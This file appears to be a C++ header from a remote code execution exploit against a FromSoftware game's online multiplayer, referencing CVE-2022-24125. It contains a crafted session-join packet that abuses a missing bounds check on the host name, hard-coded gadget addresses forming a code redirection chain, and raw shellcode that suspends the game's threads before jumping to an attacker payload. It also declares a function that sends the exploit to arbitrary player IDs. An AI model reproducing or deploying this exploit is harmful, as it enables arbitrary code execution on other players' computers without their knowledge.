#pragma once
#ifndef _RCE_H
#define _RCE_H

#include <stdint.h>
#include <vector>

// Carefully constructed session join data, the core of the exploit. This entire data is stored in
// the form of a size delimited entry list. 
static const uint8_t rce_header[] = {
	// First 0x30 bytes here is not related to the exploit. 
	
	// First entry: Type 2, Data size 0x1C. Appears to be used by the game to send spawn map ID, coordinates and 
	// orientation to the player about to join the host's session. The specific bytes below are copied
	// from real game data.
	0x02, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x33, 0xAE, 0xC7, 0xC1, 0xC3,
	0xC3, 0xF5, 0x5E, 0xC2, 0xA4, 0xD0, 0x8D, 0xC3, 0x7C, 0x60, 0xC1, 0xBD, 0xC0, 0x32, 0x0A, 0x03,
	0x00, 0x00, 0x00, 0x00, 
	
	// Second entry: Type 2, length 4. I'm not sure what this is used for.
	0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,

	// Rest is the NRSSR data stored in its own size delimited entry.

	0x01, 0x00, 0x00, 0x00, // Entry type/id field
	
	// Size of the entry. here this is set to the stack memory address of the data_buffer field 
	// of the DLMemoryInputStream game object which will contain our packet. The exploit relies on the 
	// fact that this data is processed by the game's meain thread and that ALSR is disabled, making 
	// the memory address constant. 
	0xB0, 0xF3, 0x14, 0x00, 
	
	0x4E, 0x58, 0x52, 0x56, // NRSSR signature
	0x05, 0x84,		// NRSSR version number
	0x04,			// Number of entries in the property list

	// NRSSR property list: The existence of these fields is essential to the exploit. 
	// This data consists of a chain of fields - 4/8 byte integers or strings encoded as follows: 
	// struct NRSSRProperty {
	//     uint32_t id;
	//     uint8_t type;	// 1 = 4 byte, 2 and 3 = 8 byte, 4 = null terminated wide string
	//     uint8_t unknown;
	//     uint8_t value[0];
	// }
	// Note that the game uses a stack buffer with no bounds check to copy the string properties, 
	// allowing the exploit to be initiated from here as well. However we use the host name field 
	// instead as it leads to a smaller minimum payload size.
	// 
	// The freedom provided by this list allows us to write memory addresses at different offsets 
	// from the start of the packet, which will allow us to setup a code redirection chain via 
	// virtual calls. However if the type of any property is invalid the game will drop our packet,
	// so we still have to construct it carefully. 
	0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x01, 0x01, 0x01,

	// Offset 0x18: 140e97700 (loads 144786150 into rax, then returns)
	0x00, 0x77, 0xE9, 0x40, 0x01, 0x00, 0x00, 0x00, 
	
	0x00, 0x00, 0x01, 0x04, 0x00, 0x01, 0x01, 0x01, 
	0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
	0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 
	0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,

	// Offset 0x40: 1422be020 (first arbitrary code redirection, sets up registers then calls offset 0x68)
	0x20, 0xE0, 0x2B, 0x42, 0x01, 0x00, 0x00, 0x00, 
	
	0x00, 0x00, 0x03, 0x04, 0x00, 0x01, 0x01, 0x01,
	0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 
	0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
	0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 
	
	// 0x68: 140e40f15. This gadget does almost everything for us. It calls offset 0x18 to get a memcpy
	// destination pointer, copies our packet there and then calls the virtual function at offset 0x68 
	// on static object at 144786998, which we now fully control because of the memcpy call.
	0x15, 0x0F, 0xE4, 0x40, 0x01, 0x00, 0x00, 0x00,
	
	// This final part is required to make this a valid NRSSR property list.
	0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00

	// Normal NRSSR data would then include the host's Steam name as a null terminated wide string 
	// followed by his Steam ID 64 as a uint64_t, a uint16_t indicating session data size and then 
	// the session data which is simply the Steam lobby ID. However for the exploit we use the lack of 
	// bounds checking on the host name to corrupt the stack and eventually modify the DLMemoryInputStream's
	// vftable, causing the next character read from the string to trigger the code redirection exploit.
};

// Bytecode that suspend all other threads, re-copies the actual payload at a static address and jumps to it. 
// Because the exploit overwrites large amounts of game memory which may be accessed by other threads, doing 
// this instead of directly jumping to the payload allows us to use the full maximum theoretical payload size 
// and makes the exploit extremely reliable. The small size of this routine allows us to load it in a region 
// where other game threads do not write to memory at all, or at least very rarely.
static const uint8_t rce_suspend_threads[] = { 
	0x48, 0x83, 0xEC, 0x48, 0x48, 0xB9, 0xEA, 0x9D, 0xFC, 0x41, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15,
	0x2C, 0xD3, 0x61, 0x00, 0xFF, 0x15, 0x0E, 0xD4, 0x61, 0x00, 0x4C, 0x8B, 0xE0, 0xFF, 0x15, 0x05,
	0xD5, 0x61, 0x00, 0x4C, 0x8B, 0xE8, 0x48, 0xB9, 0x8F, 0x68, 0x78, 0x44, 0x01, 0x00, 0x00, 0x00,
	0xFF, 0x15, 0xC2, 0xD1, 0x61, 0x00, 0x48, 0xBA, 0xA9, 0x68, 0x78, 0x44, 0x01, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x3F, 0xD4, 0x61, 0x00, 0x4C, 0x8B, 0xF0, 0x48, 0xB9, 0xB5, 0x68,
	0x78, 0x44, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x9C, 0xD1, 0x61, 0x00, 0x48, 0xBA, 0xC9, 0x68,
	0x78, 0x44, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x19, 0xD4, 0x61, 0x00, 0x4C,
	0x8B, 0xF8, 0x48, 0x31, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x44, 0x24, 0x30, 0x48,
	0x89, 0x44, 0x24, 0x28, 0x48, 0x31, 0xC9, 0x48, 0x89, 0x4C, 0x24, 0x20, 0x49, 0xB9, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0xB8, 0xFF, 0xFF, 0x1F, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x10, 0x49, 0x8B, 0xCC, 0x41, 0xFF, 0xD7, 0x85, 0xC0, 0x0F, 0x85, 0x1A, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x41, 0xFF, 0xD6, 0x4C, 0x39, 0xE8, 0x74, 0xBC, 0x48, 0x8B,
	0x4C, 0x24, 0x30, 0xFF, 0x15, 0xBF, 0xD1, 0x61, 0x00, 0xEB, 0xAF, 0x49, 0xB8, 0x00, 0xF0, 0x14,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD3, 0x48, 0x81, 0xC2, 0x50, 0x08, 0x00, 0x00, 0x48,
	0xB9, 0xA0, 0x69, 0x78, 0x44, 0x01, 0x00, 0x00, 0x00, 0xE8, 0x7A, 0xCE, 0x83, 0xFD, 0x48, 0x83,
	0xC4, 0x48, 0xE9, 0x11, 0x01, 0x00, 0x00, 0x4B, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6E, 0x00, 0x65,
	0x00, 0x6C, 0x00, 0x33, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x00,
	0x00, 0x47, 0x65, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x49, 0x64, 0x00, 0x6E, 0x00, 0x74,
	0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x00,
	0x00, 0x4E, 0x74, 0x47, 0x65, 0x74, 0x4E, 0x65, 0x78, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64,
	0x00
};

// Send the exploit to the given players through a PushRequestVisit packet via the RequestSendMessageToPlayers 
// request (CVE-2022-24125). Yes, the server seriously allows any client to send an arbitrary push request to 
// an arbitrary number of players. I don't know what Fromsoft was thinking there. Note that this is not required
// for the exploit. A player could edit the NRSSR data that is sent by the game through regular matchmaking calls 
// and then delivered to the target Visit/AllowBreakInTarget/QuickMatch push requests. However the existence of
// RequestSendMessageToPlayers makes this exploit much more serious.
bool rce(const std::vector<uint8_t>& payload, const std::vector<uint32_t>& player_ids);

#endif
